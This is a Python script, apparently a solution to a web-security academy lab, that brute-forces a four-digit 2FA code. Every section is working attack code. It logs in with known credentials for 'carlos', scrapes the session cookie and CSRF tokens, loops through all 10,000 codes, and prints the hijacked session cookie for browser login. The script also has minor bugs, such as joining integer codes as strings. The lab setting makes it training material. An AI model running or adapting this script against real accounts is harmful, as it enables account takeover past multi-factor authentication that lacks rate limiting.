##########################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 31/8/2023
#
# Lab: 2FA bypass using a brute-force attack
#
# Steps: 1. GET /login page and extract the session from cookie header
#           and csrf token from the body
#        2. POST /login with valid credentials, extracted session
#           and the csrf token
#        3. Obtain the new session
#        4. GET /login2 with the new session
#        5. Extract csrf token from the body of /login2
#        6. POST the mfa-code with the new session and the new
#           extracted csrf token
#        7. Repeat the process with all possbile numbers
#
##########################################################################

###########
# imports
###########
import requests
import re
import time
from colorama import Fore

#############################
# Global Variables
#############################
FAILED_CODES = []
FAILED_CODES_COUNTER = 0


# change this to your lab URL
url = "https://0a2800260408bd5d8776e031006500e2.web-security-academy.net"

start_time = time.time()  # capture the time before brute forcing

print(Fore.WHITE + "[#] Brute forcing the mfa-code of " +
      Fore.GREEN + "carlos" + "..")
for (index, code) in enumerate(range(0, 10000)):
    try:
        get_login_res = requests.get(
            url+"/login", allow_redirects=False)  # GET /login page
        if get_login_res.status_code == 200:
            get_login_session = get_login_res.cookies.get(
                "session")  # get session and token from /login
            get_login_token = re.findall("csrf.+value=\"(.+)\"",
                                         get_login_res.content.decode())[0]  # extract the csrf token
            try:
                login_cookies = {
                    'session': get_login_session
                }
                login_data = {
                    'username': 'carlos',
                    'password': 'montoya',
                    'csrf': get_login_token
                }
                post_login_res = requests.post(
                    url+'/login', data=login_data, cookies=login_cookies, allow_redirects=False)  # login with valid credentials
                if post_login_res.status_code == 302:  # if you logged in successfully
                    post_login_session = post_login_res.cookies.get(
                        "session")  # get the new session
                    cookies = {
                        'session': post_login_session
                    }
                    try:
                        get_login2_res = requests.get(
                            url+"/login2", cookies=cookies, allow_redirects=False)
                        get_login2_token = re.findall(
                            "csrf.+value=\"(.+)\"", get_login2_res.content.decode())[0]  # get new csrf token
                        try:
                            data = {
                                "csrf": get_login2_token,
                                "mfa-code": f"{code:04}"
                            }
                            post_code_response = requests.post(
                                f"{url}/login2", data, cookies=cookies, allow_redirects=False)  # try the mfa-code
                            if post_code_response.status_code == 302:
                                # if a redirect happened; means a valid code is found

                                new_session = post_code_response.cookies.get(
                                    "session")
                                print(Fore.WHITE + "\n✅ Correct code: " +
                                      Fore.GREEN + f"{code:04}")
                                print(Fore.WHITE + "✅ New session: " +
                                      Fore.GREEN + new_session)
                                print(
                                    Fore.WHITE + "Use this session in your browser to login as " + Fore.GREEN + "carlos")
                                break
                            else:
                                elapsed_time = int(
                                    (time.time() - start_time) / 60)
                                print(Fore.WHITE + "[*] " + Fore.YELLOW + "Elapsed: " + Fore.WHITE + str(elapsed_time) + " minutes" + " || " + Fore.RED + "Failed: " + Fore.WHITE + str(FAILED_CODES_COUNTER) + " minutes" + " || " +
                                      f"({index}/10000)" + Fore.BLUE + f" {code:04} " + Fore.WHITE + " => " + Fore.RED + "Incorrect", end="\r", flush=True)
                        except:
                            FAILED_CODES_COUNTER += 1  # update the failed counter
                            # save the failed code to try it later
                            FAILED_CODES.append(code)
                            continue
                    except:
                        FAILED_CODES_COUNTER += 1  # update the failed counter
                        # save the failed code to try it later
                        FAILED_CODES.append(code)
                        continue
                else:
                    print(
                        Fore.RED + "Failed to login with valid credentials")
            except:
                FAILED_CODES_COUNTER += 1  # update the failed counter
                # save the failed code to try it later
                FAILED_CODES.append(code)
                continue
        else:
            print(Fore.RED + "Failed to GET /login page")
    except:
        FAILED_CODES_COUNTER += 1  # update the failed counter
        # save the failed code to try it later
        FAILED_CODES.append(code)
        continue

elapsed_time = int(
    (time.time() - start_time) / 60)
print(Fore.GREEN + "\n✅ Finished in : " +
      Fore.WHITE + str(elapsed_time))

print(Fore.RED + "Failed code count: " +
      Fore.WHITE + str(FAILED_CODES_COUNTER))
print(Fore.RED + "Failed codes: " + Fore.WHITE +
      "[ " + ", ".join(FAILED_CODES) + " ]")
